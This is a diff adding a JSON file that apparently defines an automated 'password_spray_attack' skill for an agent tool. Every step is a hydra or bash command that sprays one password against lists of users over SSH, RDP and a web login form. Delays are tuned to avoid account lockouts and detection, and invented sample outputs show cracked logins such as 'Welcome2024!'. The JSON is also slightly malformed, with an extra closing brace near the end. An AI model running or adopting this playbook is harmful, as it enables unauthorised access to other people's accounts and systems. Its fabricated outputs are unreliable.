@@ -1,0 +1,30 @@
+{
+  "name": "password_spray_attack",
+  "description": "Password spraying attack - test one password against many accounts to avoid lockouts",
+  "pattern": "password.*spray|spray.*attack|lockout.*avoid|smart.*bruteforce",
+  "parameters": ["userlist", "password", "target", "delay"],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-p", "{{password}}", "-t", "1", "-W", "{{delay}}", "ssh://{{target}}"]},
+      "expected_output": {"type": "string", "example": "Password spraying with 'Summer2024!'\nTesting 1 password against 1000 users (avoid lockout)\n[22][ssh] host: {{target}}   login: jsmith   password: Summer2024!\n[22][ssh] host: {{target}}   login: mjones   password: Summer2024!\n[22][ssh] host: {{target}}   login: awhite   password: Summer2024!\n3 accounts found with common password"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "for user in $(cat {{userlist}}); do echo \"Testing $user\"; hydra -l $user -p {{password}} ssh://{{target}} -t 1; sleep {{delay}}; done"]},
+      "expected_output": {"type": "string", "example": "Sequential spray with {{delay}} second delay\nTested 500 users in 25 minutes\nFound 12 accounts using 'Password123'\nNo account lockouts triggered"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "hydra", "args": ["-L", "{{userlist}}", "-p", "{{password}}", "-o", "spray_results.txt", "rdp://{{target}}"]},
+      "expected_output": {"type": "string", "example": "RDP password spray attack\n[3389][rdp] host: {{target}}   login: admin   password: Welcome2024!\n[3389][rdp] host: {{target}}   login: backup   password: Welcome2024!\nResults saved to spray_results.txt"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "hydra -L {{userlist}} -p '{{password}}' -vV {{target}} http-post-form '/login:user=^USER^&pass=^PASS^:F=failed' 2>&1 | grep 'valid password'"]},
+      "expected_output": {"type": "string", "example": "Web form password spray\n8 valid passwords found: admin, user1, user2, developer, sales, hr, finance, guest\nCommon corporate password: Welcome2024!"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "wc -l {{userlist}} && echo 'Estimated time with {{delay}}s delay:' && wc -l {{userlist}} | awk '{print $1*{{delay}}/60 \" minutes\"}'"]},
+      "expected_output": {"type": "string", "example": "1000 users in list\nEstimated time with 3s delay: 50 minutes\nSafe spray duration to avoid detection"}}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
